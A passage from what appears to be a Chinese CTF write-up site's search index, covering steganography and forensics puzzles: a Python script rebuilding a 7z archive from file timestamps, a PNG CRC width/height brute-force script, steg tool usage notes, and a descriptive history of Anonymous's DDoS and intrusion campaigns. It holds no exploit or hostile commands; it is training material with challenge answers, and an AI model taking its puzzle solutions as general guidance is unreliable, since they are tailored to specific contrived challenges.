os.path.getmtime(path)\n        s = time.ctime(file_time)\n        sec = int(s[17:19])   # \u548c\u4f60\u539f\u6765\u903b\u8f91\u4e00\u81f4\n        flag += '1' if sec &gt;= 40 else '0'\n        if len(flag) == 8:\n            out += hex(int('0b' + flag, 2))[2:].zfill(2)\n            flag = ''\n    return out\n\ndef is_clean_hex(h):\n    h2 = h.strip()\n    return len(h2) % 2 == 0 and all(c in string.hexdigits for c in h2)\n\ndef hex_to_bitstr(h):\n    return ''.join(f\"{int(h[i:i+2],16):08b}\" for i in range(0,len(h),2))\n\ndef bitstr_to_hex(bs):\n    return ''.join(hex(int(bs[i:i+8],2))[2:].zfill(2) for i in range(0,len(bs),8))\n\ndef write_bytes_from_hex(h, outpath):\n    data = bytes.fromhex(h)\n    outpath.write_bytes(data)\n    return data\n\ndef try_py7zr_extract(path, extract_to):\n    try:\n        import py7zr\n    except Exception as e:\n        return False, f\"py7zr \u672a\u5b89\u88c5\u6216\u5bfc\u5165\u5931\u8d25: {e}\"\n    try:\n        with py7zr.SevenZipFile(path, mode='r') as zf:\n            zf.extractall(path=extract_to)\n        return True, \"OK\"\n    except Exception as e:\n        return False, f\"py7zr \u89e3\u538b\u5931\u8d25: {e}\"\n\ndef main():\n    print(\"[*] \u751f\u6210\u5341\u516d\u8fdb\u5236\u4e32 ...\")\n    out = build_hex_from_mtime()\n    print(f\"[*] \u751f\u6210 hex \u957f\u5ea6: {len(out)} chars, bytes: {len(out)//2}\")\n    if not is_clean_hex(out):\n        print(\"[!] \u5341\u516d\u8fdb\u5236\u4e32\u5305\u542b\u975e\u6cd5\u5b57\u7b26\u6216\u957f\u5ea6\u4e3a\u5947\u6570\u3002\u8bf7\u6253\u5370\u67e5\u770b out \u5185\u5bb9\u3002\")\n        print(out[:2000])\n        return\n\n    # \u57fa\u672c\u68c0\u67e5\n    header = out[:8].upper()\n    print(\"[*] \u524d8\u5b57\u7b26 (4 bytes) :\", header)\n    # 7z signature = 37 7A BC AF -&gt; '377ABCAF'\n    if header == '377ABCAF':\n        print(\"[+] \u770b\u8d77\u6765\u5df2\u5305\u542b 7z \u6587\u4ef6\u5934\uff0c\u76f4\u63a5\u5199\u5165 result.ok.7z\")\n        dst = Path(WORK_DIR) / \"result.ok.7z\"\n        data = write_bytes_from_hex(out, dst)\n        print(f\"[+] \u5199\u5165 {dst} (size {len(data)} bytes). \u5c1d\u8bd5\u7528 py7zr \u89e3\u538b ...\")\n        ok, msg = try_py7zr_extract(dst, Path(WORK_DIR)/\"extracted_ok\")\n        print(\"-&gt;\", ok, msg)\n        return\n\n    print(\"[*] \u672a\u68c0\u6d4b\u5230\u6807\u51c6 7z \u6587\u4ef6\u5934 (377ABCAF)\u3002\u5f00\u59cb\u5c1d\u8bd5\u5e38\u89c1\u4f4d/\u5b57\u8282\u53d8\u6362 ...\")\n\n    bitstr = hex_to_bitstr(out)\n    variants = []\n\n    # Variant A: \u539f\u6837\uff08msb-first per byte\uff09\n    variants.append((\"orig\", out))\n\n    # Variant B: \u6bcf\u5b57\u8282\u5185\u90e8\u53cd\u8f6c\u4f4d\uff08\u4f8b\u5982 0bABCDEFGH -&gt; HGFEDCBA\uff09\n    bs_b = ''.join(bitstr[i:i+8][::-1] for i in range(0, len(bitstr), 8))\n    variants.append((\"bits_reversed_in_each_byte\", bitstr_to_hex(bs_b)))\n\n    # Variant C: \u53cd\u8f6c\u5b57\u8282\u5e8f\uff08\u6700\u540e\u4e00\u4e2a\u5b57\u8282\u53d8\u4e3a\u7b2c\u4e00\u4e2a\uff09\n    bytes_list = [out[i:i+2] for i in range(0, len(out), 2)]\n    bytes_rev = ''.join(reversed(bytes_list))\n    variants.append((\"bytes_reversed_order\", bytes_rev))\n\n    # Variant D: bytes order reversed + bits reversed in each byte\n    # do bits reverse on bytes_rev\n    bs_from_bytes_rev = hex_to_bitstr(bytes_rev)\n    bs_d = ''.join(bs_from_bytes_rev[i:i+8][::-1] for i in range(0, len(bs_from_bytes_rev), 8))\n    variants.append((\"bytes_reversed_and_bits_reversed_in_each_byte\", bitstr_to_hex(bs_d)))\n\n    # Variant E: \u5168\u4f4d\u53cd\u8f6c\uff08\u628a\u6574\u4e2a\u4f4d\u4e32\u53cd\u8fc7\u6765\uff0c\u7136\u540e\u6309 8 \u4f4d\u5206\u7ec4\uff09\n    bs_e = bitstr[::-1]\n    variants.append((\"all_bits_reversed_then_group\", bitstr_to_hex(bs_e)))\n\n    # \u8bd5\u5199\u6bcf\u4e2a\u53d8\u4f53\u5e76\u68c0\u67e5 7z header +\uff08\u82e5\u53ef\u7528\uff09\u5c1d\u8bd5 py7zr \u89e3\u538b\n    found = False\n    for idx, (name, hexstr) in enumerate(variants, start=1):\n        p = Path(WORK_DIR) / f\"result_variant_{idx}_{name}.7z\"\n        try:\n            data = write_bytes_from_hex(hexstr, p)\n        except Exception as e:\n            print(f\"[!] \u5199\u5165 {p} \u5931\u8d25: {e}\")\n            continue\n        print(f\"[&gt;] \u5199\u5165 {p} (size {len(data)} bytes); header: {data[:4].hex().upper()}\")\n        if data[:4] == bytes.fromhex(\"377ABCAF\"):\n            print(f\"[+] \u53d8\u6362 {name} \u547d\u4e2d 7z signature (377ABCAF)\u3002\u5c1d\u8bd5\u7528 py7zr \u89e3\u538b ...\")\n            ok, msg = try_py7zr_extract(p, Path(WORK_DIR)/f\"extracted_{idx}_{name}\")\n            print(\"-&gt;\", ok, msg)\n            if ok:\n                # \u590d\u5236\u4e3a\u6700\u7ec8\u6210\u529f\u6587\u4ef6\n                final = Path(WORK_DIR) / \"result.ok.7z\"\n                final.write_bytes(data)\n                print(f\"[+] \u5df2\u751f\u6210 result.ok.7z \u5e76\u89e3\u538b\u5230 extracted_{idx}_{name}\uff0c\u8bf7\u67e5\u770b snow.txt\")\n                found = True\n                break\n        else:\n            print(f\"    header mismatch: {data[:4].hex().upper()} != 377ABCAF\")\n\n    if not found:\n        print(\"[!] \u5c1d\u8bd5\u5b8c\u6240\u6709\u5e38\u89c1\u53d8\u6362\u540e\u4ecd\u672a\u627e\u5230\u6709\u6548 7z header\u3002\")\n        print(\"\u5efa\u8bae\uff1a\")\n        print(\"  1) \u68c0\u67e5 out \u662f\u5426\u786e\u5b9e\u5305\u542b 1936 bit (\u5373 len(out)//2 \u5e94 = 242 bytes)\u3002\")\n        print(\"  2) \u5982\u679c\u4f60\u624b\u52a8 copy/paste \u8fc7 hex\uff0c\u53ef\u80fd\u7c98\u8d34\u65f6\u4e22\u4e86\u5b57\u7b26\u6216\u52a0\u5165\u4e86\u6362\u884c\u3002\u786e\u4fdd\u76f4\u63a5\u7528\u811a\u672c\u751f\u6210\u5e76\u7528 bytes.fromhex \u5199\u5165\u3002\")\n        print(\"  3) \u5982\u679c\u4f60\u60f3\u6211\u7ee7\u7eed\u6df1\u6316\uff0c\u53ef\u4ee5\u628a\uff08\u6216\u6253\u5370\uff09\u524d 64 \u4e2a hex \u5b57\u8282\u7ed9\u6211\uff0c\u6211\u5e2e\u4f60\u770b header/\u7b7e\u540d\u3002\")\n    else:\n        print(\"[*] \u6210\u529f\u7ed3\u675f\u3002\")\n\nif __name__ == '__main__':\n    main()\n</code></pre> <p></p> <p>\u4f7f\u7528\u5de5\u5177\u63d0\u53d6\uff0c\u5bc6\u7801\u6211\u662f\u7206\u7834\u51fa\u6765\u7684 5201314</p> <p></p>"},{"location":"Misc/Chapter1/1-7/","title":"NTFS \u6587\u4ef6\u9690\u5199","text":""},{"location":"Misc/Chapter1/1-7/#ntfs-\u6587\u4ef6\u9690\u5199","title":"NTFS \u6587\u4ef6\u9690\u5199","text":"<p>\u4f7f\u7528\u5de5\u5177 NtfsStreamsEditor \u5bfc\u51fa\u5373\u53ef</p> <p></p>"},{"location":"Misc/Chapter1/1-8/","title":"\u6587\u4ef6\u65f6\u95f4\u6233\u9690\u5199","text":""},{"location":"Misc/Chapter1/1-8/#\u6587\u4ef6\u65f6\u95f4\u6233\u9690\u5199","title":"\u6587\u4ef6\u65f6\u95f4\u6233\u9690\u5199","text":"<p>\u538b\u7f29\u5305\u5185\u5bb9\u5982\u4e0b</p> <p></p> <p>\u5728 010 Editor \u4e2d\u6253\u5f00\u83b7\u53d6\u7cbe\u786e\u7684\u65f6\u95f4\u6233</p> <p></p> <p>\u6bcf\u4e2a\u65f6\u95f4\u6233\u540e\u4e09\u4f4d\u90fd\u4e0d\u4e00\u6837</p> <p>\u63d0\u53d6\u51fa\u6765\u8f6c ASCII \u5f97\u5230\u538b\u7f29\u5305\u5bc6\u7801</p> <p></p>"},{"location":"Misc/Chapter1/1-9/","title":"\u6587\u4ef6\u5408\u5e76\u9690\u5199","text":""},{"location":"Misc/Chapter1/1-9/#\u6587\u4ef6\u5408\u5e76\u9690\u5199","title":"\u6587\u4ef6\u5408\u5e76\u9690\u5199","text":"<p>\u4e0b\u8f7d\u6587\u4ef6\u5728 WinHex \u4e2d\u53d1\u73b0\u6709\u9690\u85cf\u6587\u4ef6</p> <p></p> <p>\u4f7f\u7528\u5de5\u5177 ForeMost \u63d0\u53d6</p> <p></p> <p>\u63d0\u53d6\u51fa\u538b\u7f29\u5305</p> <p></p> <p>\u627e\u5230 flag \u6587\u4ef6</p> <p></p> <p>\u6210\u529f\u62ff\u5230 flag</p> <p></p>"},{"location":"Misc/Chapter2/","title":"Index","text":""},{"location":"Misc/Chapter2/#anonymous-hacker-group","title":"Anonymous (hacker group)","text":"<p>Anonymous \u4e8e 2003 \u5e74\u53d1\u8ff9\u81ea\u4e00\u4e2a\u4e0d\u77e5\u540d\u8bba\u575b\u7684 4chan \u7559\u8a00\u677f</p> <p>\u8be5\u7ec4\u7ec7\u7ed3\u6784\u677e\u6563\uff0c\u5ba3\u626c\u793e\u4f1a\u6b63\u4e49</p> <p>\u533f\u540d\u8005\u6210\u5458 (\u79f0\u4e3a anons ) \u6709\u65f6\u5728\u516c\u5171\u573a\u5408\u4f1a\u6234\u7740\u76d6\u4f0a\u00b7\u798f\u514b\u65af (Guy Fawkes) \u9762\u5177</p> <p>\u8be5\u7ec4\u7ec7\u7684\u51e0\u6761\u89c4\u5219\u5305\u62ec\u4e0d\u900f\u9732\u8eab\u4efd\u3001\u4e0d\u8c08\u8bba\u8be5\u7ec4\u7ec7\u4ee5\u53ca\u4e0d\u653b\u51fb\u5a92\u4f53</p> <p>\u6210\u5458\u901a\u5e38\u4f7f\u7528\u8fd9\u6837\u7684\u53e3\u53f7\uff1a\u201c\u6211\u4eec\u662f\u533f\u540d\u8005\u3002\u6211\u4eec\u662f\u519b\u56e2\u3002\u6211\u4eec\u4e0d\u4f1a\u539f\u8c05\u3002\u6211\u4eec\u4e0d\u4f1a\u5fd8\u8bb0\u3002\u671f\u5f85\u6211\u4eec\u3002\u201d</p> <p>2006 \u5e74 7 \u6708 12 \u65e5\u7684\u4e00\u6b21\u88ad\u51fb\u4e2d\uff0c\u5927\u91cf 4chan \u8bfb\u8005\u4f7f\u7528\u76f8\u540c\u7684\u5934\u50cf\u5165\u4fb5\u82ac\u5170\u793e\u4ea4\u7f51\u7ad9 Habbo Hotel\u3002\u8fd9\u4e9b\u5934\u50cf\u963b\u6b62\u666e\u901a Habbo \u4f1a\u5458\u8fdb\u5165\u8fd9\u5bb6\u6570\u5b57\u9152\u5e97\u7684\u6e38\u6cf3\u6c60\uff0c\u5e76\u58f0\u79f0\u201c\u7531\u4e8e\u6545\u969c\u548c\u827e\u6ecb\u75c5\u800c\u5173\u95ed\u201d</p> <p>2008 \u5e74 1 \u6708 15 \u65e5\uff0c4chan \u7528\u6237\u7ec4\u7ec7\u4e86\u9488\u5bf9\u5c71\u8fbe\u57fa\u6559\u4f1a\u7684\u88ad\u51fb\u4f5c\u4e3a\u62a5\u590d\uff0c\u4ed6\u4eec\u6076\u4f5c\u5267\u62e8\u6253\u5c71\u8fbe\u57fa\u6559\u4f1a\u7684\u70ed\u7ebf\u7535\u8bdd\uff0c\u53d1\u9001\u65e8\u5728\u6d6a\u8d39\u58a8\u76d2\u7684\u9ed1\u8272\u4f20\u771f\uff0c\u5e76\u5bf9\u5176\u7f51\u7ad9\u53d1\u52a8 DDoS \u653b\u51fb</p> <p>\u533f\u540d\u8005\u4e8e 9 \u6708 17 \u65e5\u53d1\u8d77\u4e86 DDoS \u653b\u51fb\uff0c\u5bfc\u81f4 Aiplex \u7f51\u7ad9\u5173\u95ed\u4e00\u5929\u3002\u8be5\u7ec4\u7ec7\u4e3b\u8981\u4f7f\u7528 LOIC\uff0c\u968f\u540e\u5c06\u76ee\u6807\u5bf9\u51c6\u4e86\u7f8e\u56fd\u5531\u7247\u4e1a\u534f\u4f1a(RIAA) \u548c\u7f8e\u56fd\u7535\u5f71\u534f\u4f1a(MPAA)\uff0c\u6210\u529f\u4f7f\u8fd9\u4e24\u4e2a\u7f51\u7ad9\u762b\u75ea</p> <p>9 \u6708 19 \u65e5\uff0c\u672a\u6765\u7684 LulzSec \u6210\u5458 Mustafa Al-Bassam\uff08\u53c8\u540d\u201cTflow\u201d\uff09\u548c\u5176\u4ed6\u533f\u540d\u8005\u5165\u4fb5\u4e86\u53cd\u4fb5\u6743\u7ec4\u7ec7\u7248\u6743\u8054\u76df\u7684\u7f51\u7ad9</p> <p>2010 \u5e74 11 \u6708\uff0c\u533f\u540d\u8005\u53d1\u8868\u65b0\u95fb\u7a3f\u5ba3\u5e03 PayPal \u6210\u4e3a\u653b\u51fb\u76ee\u6807\u3002\u533f\u540d\u8005\u4e0e LOIC \u4e00\u8d77\u53d1\u52a8 DDoS \u653b\u51fb\uff0c\u8fc5\u901f\u762b\u75ea\u4e86 PayPal \u535a\u5ba2\u7684\u7f51\u7ad9</p> <p>12 \u6708 8 \u65e5\uff0c\u533f\u540d\u8005\u8fd8\u7834\u574f\u4e86 Visa \u548c MasterCard \u7684\u7f51\u7ad9</p> <p>2011 \u5e74 1 \u6708\uff0cTflow \u521b\u5efa\u4e86\u4e00\u4e2a\u811a\u672c\uff0c\u7a81\u5c3c\u65af\u4eba\u53ef\u4ee5\u4f7f\u7528\u5b83\u6765\u4fdd\u62a4\u4ed6\u4eec\u7684\u7f51\u7edc\u6d4f\u89c8\u5668\u514d\u53d7\u653f\u5e9c\u76d1\u63a7\uff0c\u800c\u672a\u6765\u7684 LulzSec \u6210\u5458Hector Xavier Monsegur\uff08\u522b\u540d\u201cSabu\u201d\uff09\u548c\u5176\u4ed6\u4eba\u636e\u79f0\u52ab\u6301\u4e86\u4f26\u6566\u4e00\u5bb6\u7f51\u7edc\u6258\u7ba1\u516c\u53f8\u7684\u670d\u52a1\u5668\uff0c\u5bf9\u7a81\u5c3c\u65af\u653f\u5e9c\u7f51\u7ad9\u53d1\u52a8\u4e86 DDoS \u653b\u51fb\uff0c\u4f7f\u5176\u4e0b\u7ebf\u3002Sabu \u8fd8\u4f7f\u7528\u4e00\u540d\u7a81\u5c3c\u65af\u5fd7\u613f\u8005\u7684\u8ba1\u7b97\u673a\u5165\u4fb5\u4e86\u603b\u7406\u7a46\u7f55\u9ed8\u5fb7\u00b7\u52a0\u52aa\u5e0c\u7684\u7f51\u7ad9\uff0c\u7528\u533f\u540d\u8005\u7684\u6d88\u606f\u53d6\u800c\u4ee3\u4e4b</p> <p>2011 \u5e74 2 \u6708\uff0cTflow\u3001Sabu\u3001Topiary \u548c Ryan Ackroyd \u8fd9\u56db\u4eba\u5229\u7528 SQL \u6ce8\u5165\u6f0f\u6d1e\u5165\u4fb5\u4e86 HBGary \u7f51\u7ad9</p> <p>2011 \u5e74 4 \u6708\uff0c\u533f\u540d\u8005\u53d1\u8d77\u4e86\u4e00\u7cfb\u5217\u9488\u5bf9\u7d22\u5c3c\u7684\u653b\u51fb\uff0c\u4ee5\u62a5\u590d\u7d22\u5c3c\u8bd5\u56fe\u963b\u6b62 PlayStation 3\u6e38\u620f\u673a\u906d\u5230\u9ed1\u5ba2\u653b\u51fb</p> <p>2012 \u5e74 4 \u6708\uff0c\u533f\u540d\u8005\u5165\u4fb5\u4e86 485 \u4e2a\u4e2d\u56fd\u653f\u5e9c\u7f51\u7ad9</p> <p>2012\u5e74 8 \u6708\uff0cAnons \u5165\u4fb5\u4e86\u4e4c\u5e72\u8fbe\u603b\u7406\u963f\u739b\u739b\u00b7\u59c6\u5df4\u5df4\u4ea7\u7684\u7f51\u7ad9\uff0c\u4ee5\u62a5\u590d\u4e4c\u5e72\u8fbe\u8bae\u4f1a\u8003\u8651\u5236\u5b9a\u5141\u8bb8\u6b7b\u5211\u7684\u53cd\u540c\u6027\u604b\u6cd5</p> <p>2020 \u5e74 2 \u6708\uff0c\u533f\u540d\u8005\u5165\u4fb5\u4e86\u8054\u5408\u56fd\u7f51\u7ad9\uff0c\u5e76\u521b\u5efa\u4e86\u4e00\u4e2a\u9488\u5bf9\u53f0\u6e7e\u7684\u9875\u9762\uff0c\u88ab\u9ed1\u9875\u9762\u4e0a\u6709\u53f0\u6e7e\u56fd\u65d7\u3001\u56fd\u6c11\u515a\u5fbd\u7ae0\u3001\u53f0\u6e7e\u72ec\u7acb\u65d7\u5e1c</p> <p>2020 \u5e74\uff0c\u533f\u540d\u8005\u5f00\u59cb\u5bf9\u5c3c\u65e5\u5229\u4e9a\u653f\u5e9c\u53d1\u52a8\u7f51\u7edc\u653b\u51fb</p> <p>9 \u6708 11 \u65e5\uff0c\u8be5\u7ec4\u7ec7\u5165\u4fb5\u4e86\u5fb7\u514b\u8428\u65af\u5dde\u5171\u548c\u515a\u7684\u7f51\u7ad9</p> <p>9 \u6708 13 \u65e5\uff0c\u533f\u540d\u8005\u53d1\u5e03\u4e86\u5927\u91cf\u5c5e\u4e8e Epik \u7684\u79c1\u4eba\u6570\u636e\uff0cEpik \u662f\u4e00\u5bb6\u57df\u540d\u6ce8\u518c\u5546\u548c\u7f51\u7edc\u6258\u7ba1\u516c\u53f8\uff0c\u4ee5\u5411\u6258\u7ba1\u6781\u53f3\u7ffc\u3001\u65b0\u7eb3\u7cb9\u548c\u5176\u4ed6\u6781\u7aef\u4e3b\u4e49\u5185\u5bb9\u7684\u7f51\u7ad9\u63d0\u4f9b\u670d\u52a1\u800c\u95fb\u540d</p> <p>2022 \u5e74 2 \u6708 25 \u65e5\uff0c\u533f\u540d\u8005\u6cc4\u9732\u4e86\u767d\u4fc4\u7f57\u65af\u6b66\u5668\u5236\u9020\u5546 Tetraedr \u7684 200 GB \u7535\u5b50\u90ae\u4ef6\uff0c\u8be5\u516c\u53f8\u4e3a\u4fc4\u7f57\u65af\u5165\u4fb5\u4e4c\u514b\u5170\u63d0\u4f9b\u4e86\u540e\u52e4\u652f\u6301</p> <p>2022 \u5e74 3 \u6708 7 \u65e5\uff0c\u533f\u540d\u8005 DepaixPorteur \u548c TheWarriorPoetz \u5728 Twitter \u4e0a\u5ba3\u5e03\u4ed6\u4eec\u5165\u4fb5\u4e86 400 \u4e2a\u4fc4\u7f57\u65af\u76d1\u63a7\u6444\u50cf\u5934\uff0c\u5e76\u5728\u7f51\u7ad9\u4e0a\u8fdb\u884c\u4e86\u76f4\u64ad\u3002\u533f\u540d\u8005\u8fd8\u5165\u4fb5\u4e86\u4fc4\u7f57\u65af\u7535\u89c6\u53f0\uff0c\u5e76\u901a\u8fc7\u5b83\u4eec\u64ad\u653e\u4e4c\u514b\u5170\u97f3\u4e50\u5e76\u64ad\u653e\u672a\u7ecf\u5ba1\u67e5\u7684\u4e4c\u514b\u5170\u4e8b\u4ef6\u65b0\u95fb</p> <p>2022 \u5e74 9 \u6708 18 \u65e5\uff0cYourAnonSpider\u5165\u4fb5\u4e86\u4f0a\u6717\u4f0a\u65af\u5170\u9769\u547d\u6700\u9ad8\u9886\u8896\u963f\u91cc\u00b7\u54c8\u6885\u5185\u4f0a\u7684\u5b98\u65b9\u7f51\u9875\uff0c\u4ee5\u62a5\u590d\u9a6c\u8d6b\u8428\u00b7\u963f\u7c73\u5c3c\u7684\u6b7b\u3002\u533f\u540d\u8005\u5bf9\u4f0a\u6717\u653f\u5e9c\u548c\u56fd\u6709\u7f51\u7ad9\u53d1\u8d77\u4e86 DDoS \u653b\u51fb</p> <p>2022 \u5e74 9 \u6708 23 \u65e5\uff0c\u4e00\u540d\u540d\u4e3a \u201cEdaalate Ali\u201d \u7684\u9ed1\u5ba2\u6d3b\u52a8\u5206\u5b50\u5728\u5e7f\u64ad\u4e2d\u9014\u5165\u4fb5\u4e86\u4f0a\u6717\u56fd\u5bb6\u7535\u89c6\u53f0\u653f\u5e9c\u9891\u9053\uff0c\u5e76\u53d1\u5e03\u4e86\u4f0a\u6717\u76d1\u72f1\u8bbe\u65bd\u7684\u95ed\u8def\u7535\u89c6\u5f55\u50cf</p> <p>2022 \u5e74 10 \u6708 23 \u65e5\uff0c\u4e00\u4e2a\u540d\u4e3a \u201cBlack Reward\u201d \u7684\u4f0a\u6717\u9ed1\u5ba2\u7ec4\u7ec7\u516c\u5e03\u4e86\u5c5e\u4e8e\u4f0a\u6717\u6838\u8ba1\u5212\u7684\u673a\u5bc6\u6587\u4ef6\u548c\u7535\u5b50\u90ae\u4ef6\u7cfb\u7edf\u6587\u4ef6</p> <p>\u4e3a\u5e94\u5bf9 2022 \u5e74\u4e2d\u56fd\u53d1\u751f\u7684\u65b0\u51a0\u80ba\u708e\u6297\u8bae\u6d3b\u52a8\uff0c\u201c\u533f\u540d\u8005\u4f0a\u6717\u884c\u52a8\u201d \u53d1\u8d77\u4e86 \u7684 \u201c\u767d\u76ae\u4e66\u884c\u52a8\u201d\uff0c\u653b\u51fb\u5e76\u5173\u95ed\u4e86\u4e2d\u56fd\u653f\u5e9c\u63a7\u5236\u7684\u7f51\u7ad9\uff0c\u5e76\u6cc4\u9732\u4e86\u4e00\u4e9b\u4e2d\u56fd\u653f\u5e9c\u5b98\u5458\u7684\u4e2a\u4eba\u4fe1\u606f\u3002</p> <p></p>"},{"location":"Misc/Chapter2/2-1/","title":"PNG CRC \u5bbd\u9ad8\u7206\u7834","text":""},{"location":"Misc/Chapter2/2-1/#png-crc-\u5bbd\u9ad8\u7206\u7834","title":"PNG CRC \u5bbd\u9ad8\u7206\u7834","text":"<p>\u8fd9\u7c7b\u9898\u4e00\u822c\u90fd\u662f\u7ed9\u4f60\u56fe\u7247\uff08PNG \u6216\u8005 JPG\uff09</p> <p>\u7136\u540e\u901a\u8fc7\u811a\u672c\u548c\u7f16\u8f91\u5341\u516d\u8fdb\u5236\u6062\u590d\u56fe\u7247</p> <p>\u5982\u679c\u4f7f\u7528 010 Editor \u6253\u5f00\u4f1a\u6709\u63d0\u793a </p> <p>\u4e0b\u8f7d\u6587\u4ef6\u540e\u6253\u5f00\u4f1a\u660e\u663e\u53d1\u73b0\u5c11\u4e86\u4e00\u90e8\u5206</p> <p></p> <p>PNG \u56fe\u7247\u53ef\u4ee5\u901a\u8fc7\u7206\u7834 CRC \u5f97\u5230\u539f\u59cb\u5bbd\u9ad8\uff1a</p> <p>\u200b   CRC\uff08\u5faa\u73af\u5197\u4f59\u6821\u9a8c\uff09\u662f\u4e00\u79cd\u7528\u4e8e\u68c0\u6d4b\u9519\u8bef\u7684\u6280\u672f</p> <p>\u200b   \u5b83\u901a\u8fc7\u4e00\u4e2a\u7b97\u6cd5\u8ba1\u7b97\u6570\u636e\u5757\u7684\u6821\u9a8c\u503c\uff0c\u5e76\u5c06\u5176\u9644\u52a0\u5230\u6570\u636e\u5757\u7684\u672b\u5c3e</p> <p>\u200b   \u63a5\u6536\u65b9\u4f7f\u7528\u76f8\u540c\u7684\u7b97\u6cd5\u8ba1\u7b97\u63a5\u6536\u5230\u7684\u6570\u636e\u5757\u7684\u6821\u9a8c\u503c</p> <p>\u200b   \u5e76\u4e0e\u63a5\u6536\u5230\u7684 CRC \u8fdb\u884c\u6bd4\u8f83</p> <p>\u200b   \u4ee5\u68c0\u67e5\u6570\u636e\u662f\u5426\u5728\u4f20\u8f93\u8fc7\u7a0b\u4e2d\u88ab\u7be1\u6539</p> <p>PNG \u6587\u4ef6\u7ed3\u6784\u5206\u6790\uff1a</p> <pre><code>\u9996\u5148\u662f PNG \u6807\u8bc6\u7b26\u56fa\u5b9a 8 \u5b57\u8282\uff1a\n    89 50 4E 47 0D 0A 1A 0A\n\n\u63a5\u4e0b\u6765\u662f\u4e24\u4e2a\u56fa\u5b9a\u503c\uff1a\n    1. 00 00 00 0D\uff1aIHDR \u6570\u636e\u5757\u6570\u636e\u57df\u957f\u4e3a 13\uff08\u56fa\u5b9a\uff09\n    2. 49 48 44 52\uff1aIHDR \u6570\u636e\u7c7b\u578b\u7801\uff08\u56fa\u5b9a\uff09\n\n\u63a5\u4e0b\u6765\u662f\u91cd\u8981\u7684 IHDR\uff1a\n    1. \u56fe\u50cf\u5bbd\u5ea6\uff1a4 \u5b57\u8282\n    2. \u56fe\u50cf\u9ad8\u5ea6\uff1a4 \u5b57\u8282\n    3. \u56fe\u50cf\u6df1\u5ea6\uff1a1 \u5b57\u8282\n    4. \u989c\u8272\u7c7b\u578b\uff1a1 \u5b57\u8282\n    5. \u538b\u7f29\u65b9\u6cd5\uff1a1 \u5b57\u8282\n    6. \u6ee4\u6ce2\u5668\u65b9\u6cd5: 1 \u5b57\u8282\n    7. \u9694\u884c\u626b\u63cf\u65b9\u6cd5\uff1a 1 \u5b57\u8282\n    8. CRC \u6821\u9a8c\u7801\uff1a4 \u5b57\u8282\n</code></pre> <p>\u7f16\u5199\u811a\u672c\u7206\u7834</p> <pre><code>import binascii\nimport struct\n\n\ndef main():\n    # \u6253\u5f00\u56fe\u7247\n    crcbp = open(\"./\u9762\u5177.png\", \"rb\").read()\n\n    # \u8bfb\u53d6\u56fe\u7247\u4e2d\u7684 CRC \u6821\u9a8c\u503c\n    crc32frombp = int(crcbp[29:33].hex(), 16)\n\n    print(crc32frombp)\n\n    # \u5bbd\u5ea6 1-8000 \u8fdb\u884c\u679a\u4e3e\uff08\u53ef\u81ea\u884c\u66f4\u6539\uff09\n    for i in range(8000):\n        # \u9ad8\u5ea6 1-4000 \u8fdb\u884c\u679a\u4e3e\uff08\u53ef\u81ea\u884c\u66f4\u6539\uff09\n        for j in range(4000):\n            data = crcbp[12:16] + \\\n                   struct.pack('&gt;i', i) + struct.pack('&gt;i', j) + crcbp[24:29]\n\n            crc32 = binascii.crc32(data) &amp; 0xffffffff\n\n            # \u8ba1\u7b97\u5f53\u56fe\u7247\u5927\u5c0f\u4e3a i:j \u65f6\u7684 CRC \u6821\u9a8c\u503c\uff0c\u4e0e\u56fe\u7247\u4e2d\u7684 CRC \u6bd4\u8f83\uff0c\u5f53\u76f8\u540c\uff0c\u5219\u56fe\u7247\u5927\u5c0f\u5df2\u7ecf\u786e\u5b9a\n            if crc32 == crc32frombp:  \n                print(i, j)\n                print('hex:', hex(i), hex(j))\n                exit(0)\n\n\nif __name__ == '__main__':\n    main()\n</code></pre> <p>\u7206\u7834\u51fa hex \u503c</p> <p></p> <p>\u5728 WinHex \u4e2d\u627e\u5230\u4f4d\u7f6e\u4fee\u6539</p> <p></p> <p>\u518d\u6b21\u6253\u5f00\u56fe\u50cf\u6210\u529f\u62ff\u5230 flag</p> <p></p>"},{"location":"Misc/Chapter2/2-10/","title":"\u56fe\u7247\u5185\u5bb9\u9690\u5199","text":""},{"location":"Misc/Chapter2/2-10/#\u56fe\u7247\u5185\u5bb9\u9690\u5199","title":"\u56fe\u7247\u5185\u5bb9\u9690\u5199","text":"<p>\u653e\u5165 WinHex \u641c\u7d22\u5173\u952e\u5b57</p> <p></p>"},{"location":"Misc/Chapter2/2-11/","title":"StegHide \u9690\u5199\uff08Key\uff09","text":""},{"location":"Misc/Chapter2/2-11/#steghide-\u9690\u5199key","title":"StegHide \u9690\u5199\uff08Key\uff09","text":"<p>\u7ee7\u4e0a\u8282 FTP-DATA \u540e\u62ff\u5230\u56fe\u7247\uff0c\u4f7f\u7528\u5de5\u5177 StegHide \u68c0\u6d4b\u53d1\u73b0\u6709\u9690\u85cf\u6587\u4ef6</p> <p>\u6309 y \u786e\u8ba4\uff0c\u6ca1\u6709\u5bc6\u7801\u76f4\u63a5\u56de\u8f66</p> <p></p>"},{"location":"Misc/Chapter2/2-12/","title":"ExifTools \u9690\u5199","text":""},{"location":"Misc/Chapter2/2-12/#exiftools-\u9690\u5199","title":"ExifTools \u9690\u5199","text":"<p>\u4f7f\u7528\u5de5\u5177 ExifTools \u63d0\u53d6\u6240\u6709\u5143\u6570\u636e</p> <pre><code>exftool.exe reveille.jpg\n</code></pre> <p></p> <p>\u5c06\u5176\u8f6c\u4e3a\u6469\u65af\u5bc6\u7801\u62ff\u5230 flag</p> <p></p>"},{"location":"Misc/Chapter2/2-13/","title":"Extract \u9690\u5199\uff08Key\uff09","text":""},{"location":"Misc/Chapter2/2-13/#extract-\u9690\u5199key","title":"Extract \u9690\u5199\uff08Key\uff09","text":"<p>\u4e0b\u8f7d\u6587\u4ef6\u540e\u5148\u7528 stegsolve \u62ff\u5230\u5bc6\u7801</p> <p></p> <p>\u4f7f\u7528\u547d\u4ee4 extract \u63d0\u53d6\u9690\u5199\u5185\u5bb9\u5230 txt \u4e2d</p> <p></p>"},{"location":"Misc/Chapter2/2-14/","title":"SilentEye \u9690\u5199\uff08\u56fe\u7247\uff09","text":""},{"location":"Misc/Chapter2/2-14/#silenteye-\u9690\u5199\u56fe\u7247","title":"SilentEye \u9690\u5199\uff08\u56fe\u7247\uff09","text":"<p>\u9996\u5148\u662f bmp \u56fe\u7247\u9690\u5199</p> <p>\u4f7f\u7528 SilentEye \u89e3\u7801\u5373\u53ef</p> <p></p>"},{"location":"Misc/Chapter2/2-15/","title":"JPHS 